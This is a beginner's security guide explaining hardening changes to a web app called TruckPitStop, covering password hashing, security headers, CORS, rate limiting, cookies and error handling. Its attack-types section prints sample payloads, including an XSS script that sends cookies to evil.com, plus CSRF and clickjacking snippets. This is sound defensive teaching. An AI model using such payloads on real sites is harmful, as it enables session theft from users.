# Security Guide for Beginners

This guide explains the security improvements made to TruckPitStop in plain English. If you're new to web security, start here.

---

## Table of Contents

1. [Why Security Matters](#why-security-matters)
2. [Authentication & Passwords](#authentication--passwords)
3. [HTTP Security Headers](#http-security-headers)
4. [CORS (Cross-Origin Resource Sharing)](#cors-cross-origin-resource-sharing)
5. [Rate Limiting](#rate-limiting)
6. [Cookies & Sessions](#cookies--sessions)
7. [Information Leakage](#information-leakage)
8. [Common Attack Types](#common-attack-types)
9. [Glossary](#glossary)

---

## Why Security Matters

Your web application handles sensitive data:
- **User credentials** (emails, passwords)
- **Business data** (repair orders, invoices, customer info)
- **Payment information** (Stripe IDs, transaction records)

Without proper security, attackers can:
- Steal user accounts
- Access data they shouldn't see
- Impersonate users or admins
- Take down your service

**The goal**: Make attacks difficult, expensive, and detectable.

---

## Authentication & Passwords

### What We Changed

```python
# backend/app/core/password_policy.py (NEW FILE)
def validate_password(password: str) -> None:
    # Requires: 8+ chars, uppercase, lowercase, digit, special char
```

### Why It Matters

**Weak passwords** are the #1 way accounts get hacked. Common attacks:

| Attack | How It Works | Defense |
|--------|--------------|---------|
| **Brute Force** | Try every combination (aaa, aab, aac...) | Long passwords = more combinations |
| **Dictionary Attack** | Try common words (password, 123456, qwerty) | Require complexity + block common passwords |
| **Credential Stuffing** | Use leaked passwords from other sites | Unique passwords per site (user education) |

### Password Complexity Requirements

Our new policy requires:
- At least 8 characters (more = better)
- One uppercase letter (A-Z)
- One lowercase letter (a-z)
- One digit (0-9)
- One special character (!@#$%^&*...)
- Not a common password (password123, admin, etc.)

**Example of a GOOD password**: `Tr@ck$hop2024!`  
**Example of a BAD password**: `password` (too common, no complexity)

### bcrypt Hashing

```python
# backend/app/core/security.py
bcrypt.gensalt(rounds=12)  # We increased from default 10 to 12
```

**What is hashing?**  
Hashing converts a password into a scrambled string that can't be reversed:

```
"MyPassword123!" → "$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/X4...."
```

Even if someone steals your database, they can't see the actual passwords.

**What are "rounds"?**  
Rounds = how many times the algorithm scrambles the password. More rounds = slower to compute = harder to crack.

| Rounds | Time to Hash | Time to Crack 1 Billion Passwords |
|--------|--------------|-----------------------------------|
| 10 | ~100ms | ~3 years |
| 12 | ~300ms | ~50 years |
| 14 | ~1 second | ~800 years |

We use 12 rounds as a balance between security and user experience.

---

## HTTP Security Headers

### What We Changed

```python
# backend/app/main.py
@app.middleware("http")
async def add_security_headers(request, call_next):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    # ... more headers
```

### Why It Matters

Security headers tell browsers how to behave. Without them, browsers allow risky behavior by default.

### Header Explanations

#### X-Content-Type-Options: nosniff

**Problem**: Browsers try to "guess" file types. An attacker uploads a malicious file disguised as an image.

```
attacker-uploads: evil.jpg (actually contains JavaScript)
browser-thinks: "This looks like JavaScript, let me run it!"
result: Your site is hacked
```

**Solution**: `nosniff` tells the browser: "Trust the Content-Type header, don't guess."

#### X-Frame-Options: DENY

**Problem**: Attackers embed your site in a hidden frame on their site (clickjacking).

```html
<!-- Attacker's site -->
<iframe src="https://yoursite.com/delete-account" style="opacity: 0"></iframe>
<button>Click here to win a prize!</button>
<!-- User clicks "prize" button, actually clicks "delete account" -->
```

**Solution**: `DENY` prevents your site from being embedded in frames.

#### X-XSS-Protection: 1; mode=block

**Problem**: Cross-Site Scripting (XSS) - attackers inject malicious scripts.

```
URL: yoursite.com/search?q=<script>stealCookies()</script>
```

**Solution**: Browser detects suspicious scripts and blocks the page.

#### Referrer-Policy: strict-origin-when-cross-origin

**Problem**: When users click links, the browser sends where they came from (referrer). This can leak sensitive URLs.

```
User on: yoursite.com/admin/secret-page
Clicks link to: external-site.com
External site sees: "User came from /admin/secret-page"
```

**Solution**: Only send the domain (yoursite.com), not the full path.

#### Strict-Transport-Security (HSTS)

**Problem**: Users type `http://` instead of `https://`, sending data unencrypted.

**Solution**: Browser remembers "always use HTTPS for this site" for 1 year.

```
User types: http://yoursite.com
Browser automatically: https://yoursite.com
```

#### Permissions-Policy

**Problem**: Malicious scripts try to access camera, microphone, location.

**Solution**: Explicitly disable features you don't need:

```python
"geolocation=(), microphone=(), camera=()"
# Translation: "No scripts can use these features"
```

---

## CORS (Cross-Origin Resource Sharing)

### What We Changed

```python
# Before (DANGEROUS)
allow_methods=["*"],
allow_headers=["*"],

# After (SECURE)
allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
allow_headers=["Authorization", "Content-Type", "X-Requested-With"],
```

### Why It Matters

**Same-Origin Policy**: Browsers block websites from talking to other websites by default.

```
yoursite.com → can access → yoursite.com/api ✅
evilsite.com → can access → yoursite.com/api ❌ (blocked)
```

**CORS** is how you allow specific exceptions.

### The Problem with `*` (Allow Everything)

```python
allow_methods=["*"]  # Allows ANY method
allow_headers=["*"]  # Allows ANY header
```

This means attackers could:
- Use unusual HTTP methods (TRACE, CONNECT) that might bypass security
- Send custom headers that confuse your server

### Our Secure Configuration

```python
allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]
# Only standard REST methods

allow_headers=["Authorization", "Content-Type", "X-Requested-With"]
# Only headers we actually need
```

---

## Rate Limiting

### What We Changed

```python
# backend/app/api/v1/endpoints/quotes.py
@limiter.limit("10/minute")  # Max 10 requests per minute
async def get_quote_by_token(...):

@limiter.limit("5/minute")   # Max 5 requests per minute
async def approve_quote_by_token(...):
```

### Why It Matters

Without rate limiting, attackers can:

| Attack | Description | Example |
|--------|-------------|---------|
| **Brute Force** | Guess passwords/tokens rapidly | Try 1000 tokens per second |
| **DoS** | Overwhelm server with requests | Send 1 million requests |
| **Scraping** | Steal all your data | Download every customer record |

### How Rate Limiting Helps

```
Normal user: 5 requests/minute ✅
Attacker: 1000 requests/minute → 995 blocked ❌
```

### Our Rate Limits

| Endpoint | Limit | Why |
|----------|-------|-----|
| `/login` | 5/minute | Prevent password guessing |
| `/register` | 10/minute | Prevent spam accounts |
| `/forgot-password` | 3/hour | Prevent email bombing |
| Magic link view | 10/minute | Prevent token guessing |
| Magic link approve | 5/minute | Prevent automated approvals |

---

## Cookies & Sessions

### What We Changed

```python
# backend/app/core/config.py
ENVIRONMENT: str = "development"

@property
def COOKIE_SECURE_EFFECTIVE(self) -> bool:
    return self.ENVIRONMENT == "production" or self.COOKIE_SECURE
```

### Why It Matters

Cookies store your login session. If stolen, attackers can impersonate you.

### Cookie Security Flags

| Flag | What It Does | Our Setting |
|------|--------------|-------------|
| `httpOnly` | JavaScript can't read the cookie | ✅ Always on |
| `secure` | Only sent over HTTPS | ✅ Auto-enabled in production |
| `sameSite` | Prevents cross-site requests | `lax` (balanced) |

### The `secure` Flag Problem

```python
COOKIE_SECURE: bool = False  # Default for development
```

**Problem**: In development, you use `http://localhost` (no HTTPS). If `secure=True`, cookies won't work.

**Solution**: We created `COOKIE_SECURE_EFFECTIVE`:
- Development: `secure=False` (cookies work on localhost)
- Production: `secure=True` (cookies only sent over HTTPS)

```python
# Automatic based on environment
if ENVIRONMENT == "production":
    secure = True  # Safe
else:
    secure = False  # Works locally
```

---

## Information Leakage

### What We Changed

```python
# Before (DANGEROUS)
raise HTTPException(detail=f"Database connection failed: {str(e)}")
# Might reveal: "Connection refused to postgres://admin:password@db.internal:5432"

# After (SECURE)
logger.error(f"Database health check failed: {e}")  # Log internally
raise HTTPException(detail="Database connection unavailable")  # Generic message
```

### Why It Matters

Error messages can reveal:
- Database credentials
- Internal server paths
- Software versions
- Business logic

**Attackers use this information** to plan more targeted attacks.

### Examples of Information Leakage

| Bad Response | What Attacker Learns |
|--------------|---------------------|
| `"PostgreSQL 13.2 error: relation 'users' does not exist"` | Database type and version |
| `"File not found: /var/www/app/secrets/api_keys.json"` | Server file structure |
| `"Invalid password for user admin@company.com"` | That email exists (enumeration) |

### The Fix: Generic Messages + Internal Logging

```python
# User sees: "Something went wrong"
# Your logs show: Full error details for debugging
```

---

## Common Attack Types

### IDOR (Insecure Direct Object Reference)

**What it is**: Accessing data by changing IDs in URLs.

```
Normal: GET /api/orders/123  (your order)
Attack: GET /api/orders/124  (someone else's order)
```

**Our fix**: Always verify the user owns the resource:

```python
if order.tenant_id != current_user.tenant_id:
    raise HTTPException(403, "Access denied")
```

### Mass Assignment

**What it is**: Sending extra fields to change things you shouldn't.

```python
# User sends:
{"name": "John", "role": "admin"}  # Trying to make themselves admin!

# Bad code:
user.update(**request_data)  # Blindly accepts all fields

# Good code:
user.name = request_data["name"]  # Only update allowed fields
```

**Status**: We identified this issue but haven't fixed all endpoints yet.

### XSS (Cross-Site Scripting)

**What it is**: Injecting malicious scripts into web pages.

```html
<!-- Attacker submits this as their "name" -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

**Our fix**: Security headers + React automatically escapes output.

### CSRF (Cross-Site Request Forgery)

**What it is**: Tricking users into performing actions on your site.

```html
<!-- On attacker's site -->
<img src="https://yoursite.com/api/transfer-money?to=attacker&amount=1000">
<!-- User's browser sends this request with their cookies! -->
```

**Our fix**: `sameSite` cookies + requiring authentication tokens.

---

## Glossary

| Term | Definition |
|------|------------|
| **Authentication** | Verifying who you are (login) |
| **Authorization** | Verifying what you can do (permissions) |
| **Hashing** | One-way transformation of data (can't be reversed) |
| **Encryption** | Two-way transformation (can be decrypted with a key) |
| **Token** | A string that proves identity (like a temporary password) |
| **JWT** | JSON Web Token - a specific token format we use |
| **Session** | Server remembers you're logged in |
| **Cookie** | Small data stored in browser, sent with every request |
| **HTTPS** | Encrypted HTTP (the 's' = secure) |
| **SSL/TLS** | The encryption protocol HTTPS uses |
| **Middleware** | Code that runs on every request (like our security headers) |
| **Rate Limiting** | Restricting how many requests someone can make |
| **Brute Force** | Trying every possible combination |
| **Enumeration** | Discovering valid usernames/emails through error messages |
| **Injection** | Inserting malicious code into inputs |
| **Sanitization** | Cleaning user input to remove dangerous content |

---

## Quick Reference: What Changed

| File | Change | Security Benefit |
|------|--------|------------------|
| `main.py` | Added security headers | Prevents XSS, clickjacking, MIME sniffing |
| `main.py` | Restricted CORS | Limits cross-origin access |
| `main.py` | Generic error messages | Prevents information leakage |
| `config.py` | SECRET_KEY validation | Ensures strong encryption key |
| `config.py` | COOKIE_SECURE_EFFECTIVE | Auto-secures cookies in production |
| `security.py` | bcrypt rounds=12 | Stronger password hashing |
| `security.py` | timezone-aware datetime | Prevents time-based bugs |
| `password_policy.py` | Complexity requirements | Prevents weak passwords |
| `quotes.py` | Rate limiting | Prevents brute force on magic links |
| `mechanics.py` | Removed customer PII | Data minimization |
| `tenant.py` | Default to "pending" | Requires approval for new tenants |

---

## Further Reading

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Most common web vulnerabilities
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security) - Browser security concepts
- [Have I Been Pwned](https://haveibeenpwned.com/) - Check if your email was in a data breach

---

## Questions?

Security is complex. If something doesn't make sense:
1. Check this guide's glossary
2. Search for the term + "web security"
3. Ask in the project discussions

**Remember**: Security is a journey, not a destination. We continuously improve.
